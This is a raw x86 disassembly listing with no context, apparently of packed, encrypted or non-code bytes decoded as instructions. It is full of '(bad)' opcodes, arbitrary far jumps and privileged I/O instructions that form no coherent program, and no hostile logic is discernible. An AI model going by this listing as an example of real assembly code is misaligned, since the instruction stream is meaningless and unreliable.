  41d6da:	lea    ebp,[ebp+0x5f]
  41d6dd:	inc    esi
  41d6de:	or     DWORD PTR [eax],esi
  41d6e0:	mov    bh,0x59
  41d6e2:	add    eax,0x8a3810c5
  41d6e7:	pop    esi
  41d6e8:	push   ebp
  41d6e9:	cmp    BYTE PTR [eax],ch
  41d6eb:	pusha  
  41d6ec:	push   esi
  41d6ed:	retf   0x3acc
  41d6f0:	js     0x41d769
  41d6f2:	xchg   esp,eax
  41d6f3:	ds sub eax,0x38a08acf
  41d6f9:	jmp    0x1d75:0x1a78e976
  41d700:	dec    edx
  41d701:	dec    edx
  41d702:	(bad)  
  41d703:	in     al,dx
  41d704:	test   BYTE PTR [eax+edx*1+0x13d78009],ah
  41d70b:	ss xchg edi,eax
  41d70d:	mov    ecx,0x93740af3
  41d712:	adc    al,0x60
  41d714:	inc    ecx
  41d715:	and    al,0x71
  41d717:	pop    ebp
  41d718:	les    ecx,FWORD PTR [esi]
  41d71a:	sub    BYTE PTR [ebx+0x23e009fb],0x73
  41d721:	mov    ebx,fs
  41d723:	rol    DWORD PTR [ebp+edi*4-0x7f3c3c0b],1
  41d72a:	or     esp,ebx
  41d72c:	iret   
  41d72d:	fcmovnbe st,st(6)
  41d72f:	(bad)  
  41d730:	cmp    BYTE PTR [edi-0x72],dl
  41d733:	inc    eax
  41d734:	inc    edx
  41d735:	imul   edi,eax,0xc2e20900
  41d73b:	adc    al,ah
  41d73d:	mov    ebx,0x2f85c1d9
  41d743:	sub    BYTE PTR [ebp+0x3],ah
  41d746:	rcl    BYTE PTR [esi-0x2fd50617],cl
  41d74c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d74d:	lods   eax,DWORD PTR ds:[esi]
  41d74e:	inc    ebp
  41d74f:	mov    ch,0x2f
  41d751:	sbb    BYTE PTR [edi+0x50],dl
  41d754:	popa   
  41d755:	test   cl,cl
  41d757:	push   es
  41d758:	jns    0x41d7af
  41d75a:	mov    DWORD PTR ds:0x7d7ee870,edi
  41d760:	mov    ?,esi
  41d762:	ficom  DWORD PTR [edi]
  41d764:	leave  
  41d765:	(bad)  
  41d766:	jp     0x41d765
  41d768:	pop    edi
  41d769:	cmp    eax,0x4c987376
  41d76e:	test   edi,ebx
  41d770:	addr16 xchg esi,eax
  41d772:	dec    ebp
  41d773:	ds dec edi
  41d775:	lea    esi,[ecx]
  41d777:	inc    eax
  41d778:	adc    edx,DWORD PTR [edx+0x78]
  41d77b:	sub    eax,0xf9c4d578
  41d780:	cli    
  41d781:	and    DWORD PTR [edi],ebx
  41d783:	icebp  
  41d784:	sbb    cl,0xf
  41d787:	push   es
  41d788:	mov    al,ds:0x5a34b265
  41d78d:	cmp    eax,0xd6aefb61
  41d792:	dec    esp
  41d793:	inc    ecx
  41d794:	mov    edi,0xc201d31f
  41d799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d79a:	sbb    edi,DWORD PTR [ecx]
  41d79c:	cmp    esp,DWORD PTR [esi-0x46c3e33f]
  41d7a2:	sar    DWORD PTR [esp+esi*8+0x74],cl
  41d7a6:	sbb    al,0xa6
  41d7a8:	xor    BYTE PTR [esi+edx*2],dl
  41d7ab:	fidiv  DWORD PTR [esi-0x65d74077]
  41d7b1:	dec    esi
  41d7b2:	(bad)  
  41d7b3:	add    edx,DWORD PTR [edi+esi*2+0x47]
  41d7b7:	jns    0x8a88f72f
  41d7bd:	sub    al,0x28
  41d7bf:	cmp    ecx,0xc20aa93a
  41d7c5:	push   edi
  41d7c6:	jmp    0x9fdbf505
  41d7cb:	push   ebx
  41d7cc:	dec    esi
  41d7cd:	aas    
  41d7ce:	ja     0x41d845
  41d7d0:	pop    edi
  41d7d1:	cmc    
  41d7d2:	pusha  
  41d7d3:	popa   
  41d7d4:	pusha  
  41d7d5:	sub    dh,BYTE PTR [esi-0x3d]
  41d7d8:	sar    DWORD PTR [ebx],cl
  41d7da:	add    edi,DWORD PTR [esi-0x138b5be9]
  41d7e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7e1:	pushf  
  41d7e2:	lds    ecx,FWORD PTR [ebp-0xaeef30d]
  41d7e8:	fwait
  41d7e9:	ins    BYTE PTR es:[edi],dx
  41d7ea:	inc    edi
  41d7eb:	mov    ?,WORD PTR [ecx-0x38]
  41d7ee:	repnz inc edx
  41d7f0:	(bad)  
  41d7f1:	add    dh,BYTE PTR [esi]
  41d7f3:	imul   ecx,DWORD PTR [ebx+0x12],0x9544c3c3
  41d7fa:	ds xchg esi,eax
  41d7fc:	in     al,dx
  41d7fd:	add    al,0x65
  41d7ff:	neg    BYTE PTR [edx]
  41d801:	inc    edx
  41d802:	jno    0x41d7cf
  41d804:	mov    dl,bl
  41d806:	imul   esi,DWORD PTR [edx+eiz*4],0xecab18ed
  41d80d:	fucomi st,st(0)
  41d80f:	es pop edi
  41d811:	call   0x84590ec
  41d816:	dec    esp
  41d817:	sbb    DWORD PTR [ecx+ebx*4-0x893019],edi
  41d81e:	mov    edi,0x6a02102b
  41d823:	aam    0x72
  41d825:	dec    eax
  41d826:	jl     0x41d849
  41d828:	or     edi,0xffffffe6
  41d82b:	push   ebx
  41d82c:	dec    esp
  41d82d:	les    ebp,FWORD PTR [edx+ebx*2+0x2303d12f]
  41d834:	dec    edi
  41d835:	push   ds
  41d836:	mov    cl,0x7e
  41d838:	and    bl,cl
  41d83a:	push   edx
  41d83b:	aas    
  41d83c:	hlt    
  41d83d:	and    ah,BYTE PTR [esi+0x79b9eea1]
  41d843:	repz add al,0x73
  41d846:	jb     0x41d8bf
  41d848:	sub    DWORD PTR [eax-0x2e],ecx
  41d84b:	mov    dh,0x62
  41d84d:	pop    eax
  41d84e:	xor    DWORD PTR [esi-0x67],edx
  41d851:	dec    ebx
  41d852:	push   eax
  41d853:	cwde   
  41d854:	retf   
  41d855:	loop   0x41d880
  41d857:	inc    esp
  41d858:	test   BYTE PTR fs:[ecx],dh
  41d85b:	lods   eax,DWORD PTR ds:[esi]
  41d85c:	cwde   
  41d85d:	sub    edx,DWORD PTR [esi]
  41d85f:	sahf   
  41d860:	mov    esi,0xf0a159dc
  41d865:	out    0x8a,al
  41d867:	jbe    0x41d806
  41d869:	jge    0x41d863
  41d86b:	jmp    0x8df606f0
  41d870:	push   ebp
  41d871:	fldenv [edi]
  41d873:	or     ebx,DWORD PTR [eax-0x6e]
  41d876:	scas   al,BYTE PTR es:[edi]
  41d877:	imul   esi,esi,0xfffffffb
  41d87a:	aas    
  41d87b:	mov    dh,0x38
  41d87d:	mov    al,ds:0xfbc9a2d6
  41d882:	fild   DWORD PTR [eax]
  41d884:	aas    
  41d885:	cmp    bh,dh
  41d887:	add    ecx,DWORD PTR [ecx+0x12]
  41d88a:	mov    DWORD PTR [esi+0x5f95f335],ecx
  41d890:	jge    0x41d8a5
  41d892:	lahf   
  41d893:	xchg   DWORD PTR [ecx+0x7a],edx
  41d896:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d897:	in     al,dx
  41d898:	nop
  41d899:	ds push ds
  41d89b:	stos   DWORD PTR es:[edi],eax
  41d89c:	xchg   ecx,eax
  41d89d:	sbb    ch,BYTE PTR [edi-0x1c153070]
  41d8a3:	jns    0x41d8f1
  41d8a5:	xchg   esi,eax
  41d8a6:	and    DWORD PTR [edx+0x3e],0x77
  41d8aa:	mov    dh,0x5c
  41d8ac:	sbb    esp,esp
  41d8ae:	and    bl,BYTE PTR [ebx+0x7cd9cb54]
  41d8b4:	test   BYTE PTR [esi],al
  41d8b6:	lock fisttp QWORD PTR [edx-0x7be7d9ee]
  41d8bd:	jb     0x41d856
  41d8bf:	mov    esi,0x9233dcd2
  41d8c4:	int3   
  41d8c5:	cs xor eax,0xccfc1603
  41d8cb:	clc    
  41d8cc:	pusha  
  41d8cd:	(bad)  
  41d8ce:	pop    edi
  41d8cf:	es xchg edi,eax
  41d8d1:	sbb    DWORD PTR [eax+edx*2-0x5ff4e97c],ecx
  41d8d8:	lea    esi,[ecx+0xf1effbe]
  41d8de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8df:	addr16 push eax
  41d8e1:	sbb    ebp,DWORD PTR [edx]
  41d8e3:	pusha  
  41d8e4:	loope  0x41d88f
  41d8e6:	mov    ch,0x6f
  41d8e8:	push   0x607182bb
  41d8ed:	lea    esp,[ecx-0x5d]
  41d8f0:	lods   eax,DWORD PTR ds:[esi]
  41d8f1:	loopne 0x41d966
  41d8f3:	cmp    eax,0x63ec1f2f
  41d8f8:	and    DWORD PTR [ecx+eax*4],esi
  41d8fb:	test   DWORD PTR [esi+0x4e949014],ecx
  41d901:	cmc    
  41d902:	dec    esi
  41d903:	and    BYTE PTR [edi],bl
  41d905:	imul   ecx,DWORD PTR [ebp-0x46],0xffffff98
  41d909:	ins    DWORD PTR es:[edi],dx
  41d90a:	mov    ebp,0x89a45cd9
  41d90f:	push   0x46
  41d911:	jecxz  0x41d90b
  41d913:	xchg   esi,eax
  41d914:	xchg   ecx,eax
  41d915:	mov    esp,?
  41d917:	mov    DWORD PTR [ebp+0x7f],ecx
  41d91a:	es push edi
  41d91c:	or     ah,BYTE PTR [ecx]
  41d91e:	xor    eax,0xe9601f21
  41d923:	and    esp,DWORD PTR [ebx]
  41d925:	add    dl,dl
  41d927:	mov    WORD PTR ds:0x987c6da2,cs
  41d92d:	fisttp WORD PTR [esi]
  41d92f:	(bad)  
  41d933:	adc    BYTE PTR [ebp+0x29f70337],cl
  41d939:	stos   DWORD PTR es:[edi],eax
  41d93a:	cmc    
  41d93b:	sbb    al,0x7e
  41d93d:	test   edi,esi
  41d93f:	push   cx
  41d941:	add    eax,0x333c135a
  41d946:	xor    eax,0x366e86fc
  41d94b:	sbb    eax,0x15f02466
  41d950:	push   eax
  41d951:	or     eax,0xdd01007d
  41d956:	sbb    cl,BYTE PTR [edi+edx*2+0x30]
  41d95a:	and    al,0xec
  41d95c:	and    cl,al
  41d95e:	retf   0x9cc
  41d961:	arpl   WORD PTR [edx+0x1d337e65],si
  41d967:	ret    0xad22
  41d96a:	jl     0x41d9df
  41d96c:	pop    esp
  41d96d:	stc    
  41d96e:	push   ebp
  41d96f:	ds in  eax,dx
  41d971:	cmp    edx,edi
  41d973:	or     bh,BYTE PTR [edi-0x56]
  41d976:	arpl   dx,bp
  41d978:	push   esp
  41d979:	enter  0xe889,0xb9
  41d97d:	pop    eax
  41d97e:	cmp    ah,cl
  41d980:	in     al,dx
  41d981:	mov    WORD PTR [ecx],ss
  41d983:	daa    
  41d984:	mov    eax,ds:0xdf0468d2
  41d989:	jns    0x41d923
  41d98b:	push   cs
  41d98c:	sbb    eax,0xf76982d0
  41d991:	sbb    eax,0xa1218d0e
  41d996:	jp     0x41d96d
  41d998:	ds jo  0x41d9ab
  41d99b:	fisttp QWORD PTR [eax+eiz*1-0x58419180]
  41d9a2:	inc    edx
  41d9a3:	sub    DWORD PTR [ebx],0xffffffce
  41d9a6:	jb     0x41d92b
  41d9a8:	add    al,0x23
  41d9aa:	fstp   DWORD PTR [esi-0x48]
  41d9ad:	outs   dx,DWORD PTR ds:[esi]
  41d9ae:	cmp    al,0xd1
  41d9b0:	jb     0x41d93a
  41d9b2:	(bad)  
  41d9b3:	(bad)  
  41d9b4:	les    ebp,FWORD PTR [edx-0x1f]
  41d9b7:	cmp    bh,BYTE PTR [ebx]
  41d9b9:	sub    BYTE PTR [ebx+0x37e8a91b],ah
  41d9bf:	mov    ah,0x38
  41d9c1:	outs   dx,DWORD PTR ds:[esi]
  41d9c2:	pop    ss
  41d9c3:	add    al,BYTE PTR [edx-0x163ed27e]
  41d9c9:	inc    edx
  41d9ca:	pop    ds
  41d9cb:	enter  0x817e,0x37
  41d9cf:	outs   dx,DWORD PTR ds:[esi]
  41d9d0:	and    DWORD PTR [edi],esi
  41d9d2:	and    ch,bh
  41d9d4:	out    0xbc,al
  41d9d6:	jo     0x41da2e
  41d9d8:	xchg   ebx,eax
  41d9d9:	dec    eax
  41d9da:	push   ecx
  41d9db:	mov    al,ds:0x21428e24
  41d9e0:	fdivr  QWORD PTR [edx+eiz*4+0x45]
  41d9e4:	aaa    
  41d9e5:	fnstsw WORD PTR [edx-0x6a8a1e97]
  41d9eb:	push   ebx
  41d9ec:	xor    esi,DWORD PTR [esi]
  41d9ee:	(bad)  
  41d9f0:	jno    0x41da0b
  41d9f2:	sub    al,0x72
  41d9f4:	cmp    BYTE PTR [edi],ah
  41d9f6:	push   esp
  41d9f7:	in     al,dx
  41d9f8:	add    al,ah
  41d9fa:	add    al,0x7f
  41d9fc:	aas    
  41d9fd:	or     edi,DWORD PTR [edx+ebx*1+0x701fe8ba]
  41da04:	popa   
  41da05:	or     eax,0xc5c68db7
  41da0a:	or     eax,0x6f8a00a0
  41da0f:	inc    esp
  41da10:	ss retf 0x6a07
  41da14:	retf   0x4ff0
  41da17:	shl    BYTE PTR [ecx],1
  41da19:	int3   
  41da1a:	lds    eax,FWORD PTR [eax]
  41da1c:	sbb    DWORD PTR [edi],edi
  41da1e:	mov    dl,0x7a
  41da20:	mov    ebp,0xac8d9bd0
  41da25:	and    BYTE PTR [eax-0x1d005042],ah
  41da2b:	pop    es
  41da2c:	int3   
  41da2d:	popa   
  41da2e:	cmp    al,0xa2
  41da30:	arpl   WORD PTR [esp+edx*1+0xadfa9ee],sp
  41da37:	mov    fs,WORD PTR [ecx]
  41da39:	icebp  
  41da3a:	iret   
  41da3b:	jmp    0xecb4c253
  41da40:	push   ds
  41da41:	lahf   
  41da42:	adc    al,0x21
  41da44:	test   al,0x7e
  41da46:	(bad)  
  41da47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da48:	out    dx,al
  41da49:	call   0x1c23:0xde4e7370
  41da50:	mov    bl,al
  41da52:	cld    
  41da53:	fsubr  QWORD PTR [esi-0x6b08983d]
  41da59:	(bad)  
  41da5a:	es adc al,al
  41da5d:	or     dl,BYTE PTR [eax]
  41da5f:	mov    bh,0x20
  41da61:	dec    esp
  41da62:	xchg   esi,eax
  41da63:	js     0x41da88
  41da65:	add    BYTE PTR [eax+0x7e098909],bl
  41da6b:	sahf   
  41da6c:	jmp    0x372b:0xdd5d51b0
  41da73:	dec    eax
  41da74:	xor    BYTE PTR [edi-0x61],bl
  41da77:	scas   al,BYTE PTR es:[edi]
  41da78:	xchg   edi,eax
  41da79:	xchg   esp,eax
  41da7a:	push   esp
  41da7b:	xchg   ebx,eax
  41da7c:	imul   ecx,DWORD PTR [ecx+0x4c],0x98455c0f
  41da83:	mov    edi,0x370acc41
  41da88:	(bad)  
  41da89:	js     0x41da9f
  41da8b:	jne    0x41dab9
  41da8d:	add    BYTE PTR [edi],dh
  41da8f:	mov    edi,0x50439944
  41da94:	jmp    0x41da8c
  41da96:	mov    cs,edi
  41da98:	push   0xffffffb2
  41da9a:	das    
  41da9b:	cmp    DWORD PTR [edx+0x24],esi
  41da9e:	pop    edx
  41da9f:	mov    cl,0xfa
  41daa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daa2:	pop    esp
  41daa3:	xchg   esi,eax
  41daa4:	xchg   edi,eax
  41daa5:	aad    0x34
  41daa7:	push   ebp
  41daa8:	adc    dl,dl
  41daaa:	inc    esi
  41daab:	pop    es
  41daac:	loopne 0x41db29
  41daae:	add    DWORD PTR [eax+0x513e03c],ebx
  41dab4:	inc    esi
  41dab5:	xchg   edx,eax
  41dab6:	jle    0x41dae4
  41dab8:	ror    BYTE PTR [ebx-0x5c036e05],cl
  41dabe:	sub    ecx,DWORD PTR [edi-0x71]
  41dac1:	popf   
  41dac2:	or     eax,0x1d3f498a
  41dac8:	mov    edi,0x2da8e15
  41dacd:	aaa    
  41dace:	add    al,BYTE PTR ds:0x53500f5a
  41dad4:	(bad)  
  41dad5:	jmp    0x9ad4:0x3493cb74
  41dadc:	rol    DWORD PTR [edi],1
  41dade:	jmp    0xe4ac:0x71d6d58
  41dae5:	mov    bl,0x77
  41dae7:	stos   DWORD PTR es:[edi],eax
  41dae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dae9:	xchg   ecx,eax
  41daea:	pop    ebp
  41daeb:	xor    DWORD PTR [edi-0x18],eax
  41daee:	jp     0x41db17
  41daf0:	rol    ebx,1
  41daf2:	xchg   ecx,eax
  41daf3:	or     eax,0xde98dd9c
  41daf8:	popf   
  41daf9:	dec    esi
  41dafa:	les    eax,FWORD PTR [ebx]
  41dafc:	adc    DWORD PTR [edx-0x73],ebp
  41daff:	adc    eax,0x3263050e
  41db04:	call   0x4ae6:0xab009cb3
  41db0b:	neg    ah
  41db0d:	jnp    0x41db1c
  41db0f:	and    eax,0x65cd4bfa
  41db14:	cld    
  41db15:	and    al,0x7e
  41db17:	retf   
  41db18:	mov    ah,0xfe
  41db1a:	cmp    eax,0xb662c308
  41db1f:	popf   
  41db20:	adc    al,0xff
  41db22:	inc    ecx
  41db23:	fwait
  41db24:	jb     0x41dae1
  41db26:	jmp    0x41db1a
  41db28:	call   0x3191c593
  41db2d:	mov    ah,0xcc
  41db2f:	and    eax,0x9a7f659e
  41db34:	mov    bh,0x9a
  41db36:	addr16 call 0xf496c7a7
  41db3c:	push   esi
  41db3e:	mov    esi,0x6b41970e
  41db43:	add    DWORD PTR [ebp-0x73ac860],ebx
  41db49:	out    0x52,eax
  41db4b:	xor    eax,0x38ba6cb0
  41db50:	popa   
  41db51:	mov    eax,0xd9aeeacd
  41db56:	or     BYTE PTR [esi+0x5a69f8cc],ah
  41db5c:	sbb    eax,0xc527d764
  41db61:	sbb    eax,0x3f9af9d2
  41db66:	dec    eax
  41db67:	cld    
  41db68:	cmp    al,0x79
  41db6a:	mov    eax,0x7076b52d
  41db6f:	sub    al,BYTE PTR [ecx-0x61]
  41db72:	retf   
  41db73:	sbb    al,0x34
  41db75:	mov    bl,0xd1
  41db77:	mov    edi,0x694926af
  41db7c:	pop    ss
  41db7d:	mov    ebx,0xe2cdb032
  41db82:	fstp   QWORD PTR [esi]
  41db84:	add    al,0x9
  41db86:	dec    esp
  41db87:	or     eax,ebx
  41db89:	adc    DWORD PTR [ebx],edi
  41db8b:	inc    edx
  41db8c:	adc    BYTE PTR [eax-0x76a5a3e0],0x4f
  41db93:	dec    ecx
  41db94:	mov    esp,0xa04d0972
  41db99:	xchg   DWORD PTR [eax+0x62],esp
  41db9c:	push   edi
  41db9d:	mov    DWORD PTR [edx+0x18],edx
  41dba0:	ss dec ebp
  41dba2:	pop    esp
  41dba3:	adc    eax,0xe67f0d53
  41dba8:	push   esp
  41dba9:	aas    
  41dbaa:	push   ebp
  41dbab:	imul   edi,eax,0x5b
  41dbae:	xchg   edx,eax
  41dbaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbb0:	mov    ds:0xa9b90554,al
  41dbb5:	add    eax,eax
  41dbb7:	push   edi
  41dbb8:	jo     0x41dbf9
  41dbba:	dec    ecx
  41dbbb:	mov    ch,0x0
  41dbbd:	imul   esi,DWORD PTR [edi],0xfffffffd
  41dbc0:	lods   al,BYTE PTR ds:[esi]
  41dbc1:	sbb    BYTE PTR [eax],0xd5
  41dbc4:	popa   
  41dbc5:	or     BYTE PTR [eax-0x10],0x18
  41dbc9:	xor    eax,0xdc4ecbf4
  41dbce:	xor    DWORD PTR [ebx],ecx
  41dbd0:	adc    BYTE PTR [edi+0x66],al
  41dbd3:	test   eax,0x27febba9
  41dbd8:	and    BYTE PTR [eax-0xe],al
  41dbdb:	pop    ss
  41dbdc:	push   0x5e677ef
  41dbe1:	dec    ebx
  41dbe2:	pop    ebp
  41dbe3:	mov    bh,0xe8
  41dbe5:	xor    ch,BYTE PTR [esi]
  41dbe7:	ds addr16 jns 0x41dbb1
  41dbeb:	mov    al,0xfe
  41dbed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbee:	ins    DWORD PTR es:[edi],dx
  41dbef:	push   edx
  41dbf0:	into   
  41dbf1:	inc    ebp
  41dbf2:	and    esi,DWORD PTR [ebp+0x4459a3b0]
  41dbf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbf9:	adc    ebx,DWORD PTR ds:[edx-0x6e]
  41dbfd:	inc    ebx
  41dbfe:	ds cmp al,0x10
  41dc01:	push   esi
  41dc02:	fiadd  DWORD PTR [edx-0x334bb21f]
  41dc08:	mov    al,ds:0x2905d050
  41dc0d:	mov    eax,ds:0x177c04a2
  41dc12:	popa   
  41dc13:	adc    BYTE PTR [ecx],ah
  41dc15:	dec    edx
  41dc16:	arpl   WORD PTR [edi-0x3f22f495],sp
  41dc1c:	idiv   BYTE PTR [ecx]
  41dc1e:	mov    ch,0x31
  41dc20:	mov    eax,0xb4bf35d7
  41dc25:	inc    esp
  41dc26:	inc    ebp
  41dc27:	cwde   
  41dc28:	call   FWORD PTR [ebp+0x44]
  41dc2b:	sbb    BYTE PTR [edi-0x2ec6cad1],0x6a
  41dc32:	mov    ch,0xe4
  41dc34:	and    eax,0xd019fdff
  41dc39:	std    
  41dc3a:	jno    0x41dc31
  41dc3c:	cmp    BYTE PTR [ebx],dh
  41dc3e:	adc    al,0x30
  41dc40:	cmp    BYTE PTR [ecx],cl
  41dc42:	xor    eax,DWORD PTR [ecx]
  41dc44:	into   
  41dc45:	aad    0xfa
  41dc47:	sbb    BYTE PTR [esi],0x4a
  41dc4a:	cmp    ah,BYTE PTR [ebx+0x13]
  41dc4d:	ja     0x41dc7c
  41dc4f:	xor    al,0x37
  41dc51:	es adc ch,0xb
  41dc55:	imul   ecx,DWORD PTR [ecx-0x4d9a851d],0xffffff97
  41dc5c:	xchg   ah,cl
  41dc5e:	inc    ecx
  41dc5f:	cmp    eax,0x9d5e4bbd
  41dc64:	fld    DWORD PTR [edi-0x32485ea5]
  41dc6a:	jo     0x41dc50
  41dc6c:	aaa    
  41dc6d:	(bad)  
  41dc6e:	lock sub bh,BYTE PTR [eax+0x33]
  41dc72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc73:	lahf   
  41dc74:	mov    edi,0x2acea5fc
  41dc79:	cdq    
  41dc7a:	inc    eax
  41dc7b:	pop    ebx
  41dc7c:	aaa    
  41dc7d:	int3   
  41dc7e:	scas   eax,DWORD PTR es:[edi]
  41dc7f:	nop
  41dc80:	dec    ebx
  41dc81:	mov    ebx,0xb92e9ea0
  41dc86:	loopne 0x41dc80
  41dc88:	inc    esp
  41dc89:	sbb    al,0x6a
  41dc8b:	shl    DWORD PTR fs:[edi],1
  41dc8e:	adc    ch,BYTE PTR [edi+0x4e]
  41dc91:	xor    al,0xb2
  41dc93:	push   eax
  41dc94:	cwde   
  41dc95:	mov    cl,0x67
  41dc97:	js     0x41dc81
  41dc99:	in     al,0x35
  41dc9b:	aad    0x5a
  41dc9d:	fisub  DWORD PTR [esi]
  41dc9f:	dec    ebx
  41dca0:	pop    esi
  41dca1:	out    dx,eax
  41dca2:	imul   esi,DWORD PTR [edx+0x7b],0xad0f3953
  41dca9:	pandn  mm2,mm4
  41dcac:	hlt    
  41dcad:	gs int 0x96
  41dcb0:	jb     0x41dc32
  41dcb2:	cmp    bl,BYTE PTR [ebp+0x29]
  41dcb5:	xchg   esi,eax
  41dcb6:	pop    esi
  41dcb7:	nop
  41dcb8:	fwait
  41dcb9:	scas   al,BYTE PTR es:[edi]
  41dcba:	xor    BYTE PTR [esi-0xc],cl
  41dcbd:	(bad)  
  41dcbe:	pop    ss
  41dcbf:	push   esp
  41dcc0:	and    DWORD PTR [eax],0xffffffe5
  41dcc3:	loopne 0x41dc59
  41dcc5:	(bad)  
  41dcc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcc7:	mov    DWORD PTR [edx-0x17bea442],esi
  41dccd:	das    
  41dcce:	outs   dx,DWORD PTR ss:[esi]
  41dcd0:	test   eax,ebp
  41dcd2:	dec    eax
  41dcd3:	pop    esi
  41dcd4:	pop    si
  41dcd6:	adc    bl,bl
  41dcd8:	and    DWORD PTR [ecx-0x6e],edi
  41dcdb:	imul   edi,DWORD PTR [esi],0xfdeef7fb
  41dce1:	mov    eax,ds:0xc53073f0
  41dce6:	xchg   edi,eax
  41dce7:	pop    esi
  41dce8:	pop    ss
  41dce9:	retf   0xa870
  41dcec:	sbb    al,0xfd
  41dcee:	push   edx
  41dcef:	out    0xc1,eax
  41dcf1:	mov    ds:0xfdb62b8c,eax
  41dcf6:	aam    0x72
  41dcf8:	sti    
  41dcf9:	push   cs
  41dcfa:	dec    edi
  41dcfb:	jmp    0x3c421a12
  41dd00:	ins    BYTE PTR es:[edi],dx
  41dd01:	or     bh,BYTE PTR ds:0x26557902
  41dd07:	outs   dx,BYTE PTR ds:[esi]
  41dd08:	add    DWORD PTR [ecx-0x64],esp
  41dd0b:	fbstp  TBYTE PTR [eax-0x28]
  41dd0e:	xchg   ebx,eax
  41dd0f:	xlat   BYTE PTR ds:[ebx]
  41dd10:	nop
  41dd11:	jb     0x41dd8f
  41dd13:	pop    esi
  41dd14:	xor    edi,DWORD PTR ds:0xfc413a7e
  41dd1a:	loope  0x41dd55
  41dd1c:	add    bx,si
  41dd1f:	jg     0x41dd3e
  41dd21:	rol    BYTE PTR [ecx-0xcbd6f25],0x49
  41dd28:	jmp    0x7df:0x5d524386
  41dd2f:	push   ebp
  41dd30:	aas    
  41dd31:	mov    ah,0xbe
  41dd33:	fdivr  st,st(3)
  41dd35:	mov    ds:0xf73c9554,eax
  41dd3a:	not    DWORD PTR [ebp+0x45]
  41dd3d:	dec    ecx
  41dd3e:	fiadd  DWORD PTR [esi+0x53edd2f4]
  41dd44:	dec    ecx
  41dd45:	fild   DWORD PTR [esi-0x5e8a7637]
  41dd4b:	test   DWORD PTR [esp+eax*4+0x7882b5bd],esi
  41dd52:	and    BYTE PTR [ecx+0x3b],al
  41dd55:	cdq    
  41dd56:	clc    
  41dd57:	inc    esp
  41dd58:	iret   
  41dd59:	cwde   
  41dd5a:	rcr    DWORD PTR [esi],cl
  41dd5c:	push   eax
  41dd5d:	push   ss
  41dd5e:	loope  0x41dd91
  41dd60:	fmul   DWORD PTR [ebp-0x6a]
  41dd63:	adc    eax,0x6a84c179
  41dd68:	pop    ss
  41dd69:	and    ecx,esp
  41dd6b:	xchg   esi,eax
  41dd6c:	sub    ecx,DWORD PTR [esi+ebx*2-0x2afc0a7d]
  41dd73:	or     eax,0xf6a0f63b
  41dd78:	xor    ecx,DWORD PTR [ebx]
  41dd7a:	and    DWORD PTR [eax],0x18e79d9c
  41dd80:	outs   dx,BYTE PTR ds:[esi]
  41dd81:	mov    cl,0x79
  41dd83:	retf   
  41dd84:	push   edx
  41dd85:	mov    eax,DWORD PTR [edi+0x118470ef]
  41dd8b:	cmp    eax,0xa5ee0e53
  41dd90:	jp     0x41ddfd
  41dd92:	(bad)  
  41dd93:	jle    0x41de12
  41dd95:	xor    DWORD PTR [edx+0x374e6b54],esi
  41dd9b:	sbb    eax,DWORD PTR [esp+edi*2-0x18]
  41dd9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dda0:	push   es
  41dda1:	mov    DWORD PTR [edi+eiz*8],edx
  41dda4:	mov    esi,DWORD PTR fs:[eax]
  41dda7:	or     al,0x21
  41dda9:	cli    
  41ddaa:	int    0xdc
  41ddac:	ss xchg esi,eax
  41ddae:	shl    cl,1
  41ddb0:	push   esp
  41ddb1:	mov    eax,ds:0xc32e0912
  41ddb6:	ret    
  41ddb7:	cmp    BYTE PTR [esi],cl
  41ddb9:	in     al,0x2c
  41ddbb:	ss mov bl,0xbf
  41ddbe:	xchg   ebx,eax
  41ddbf:	adc    ah,ch
  41ddc1:	dec    edi
  41ddc2:	push   edi
  41ddc3:	adc    DWORD PTR ds:0xb8e212c3,edi
  41ddc9:	dec    edx
  41ddca:	inc    edi
  41ddcb:	scas   eax,DWORD PTR es:[edi]
  41ddcc:	cld    
  41ddcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddce:	lahf   
  41ddcf:	out    dx,eax
  41ddd0:	add    eax,0xfdd69488
  41ddd5:	outs   dx,DWORD PTR ds:[esi]
  41ddd6:	js     0x41ddf5
  41ddd8:	xchg   esi,eax
  41ddd9:	addr16 xchg esp,eax
  41dddb:	jo     0x41dd9c
  41dddd:	jnp    0x41dd83
  41dddf:	cdq    
  41dde0:	gs add eax,0x6164c507
  41dde6:	adc    DWORD PTR es:[edi-0x45615eef],esi
  41dded:	lock dec ebx
  41ddef:	adc    DWORD PTR [ecx+0x182197c5],esi
  41ddf5:	xor    ch,BYTE PTR [ecx+0x2750e6ba]
  41ddfb:	xchg   ecx,eax
  41ddfc:	push   0xe77dcd15
  41de01:	push   es
  41de02:	xchg   BYTE PTR [edx+0xb4f450f],cl
  41de08:	dec    ebp
  41de09:	mov    ebx,0x56c58f20
  41de0e:	jp     0x41ddcc
  41de10:	inc    eax
  41de11:	imul   eax,DWORD PTR [ebx],0xffffff91
  41de14:	mov    ebx,DWORD PTR [eax-0x4d]
  41de17:	jle    0x41ddbf
  41de19:	mov    es,WORD PTR [edi-0x65]
  41de1c:	out    dx,eax
  41de1d:	mov    ch,0xd3
  41de1f:	inc    edi
  41de20:	mov    DWORD PTR [esi-0x4e],eax
  41de23:	repnz mov bh,0xd5
  41de26:	loop   0x41de48
  41de28:	(bad)  
  41de29:	clc    
  41de2a:	mov    ds:0x21e82718,eax
  41de2f:	or     al,0x69
  41de31:	cmp    ah,BYTE PTR [esi-0x41]
  41de34:	pop    esi
  41de35:	test   BYTE PTR ds:0x8784b9e2,al
  41de3b:	jecxz  0x41de15
  41de3d:	mov    eax,ds:0x28851231
  41de42:	mov    dh,0xc
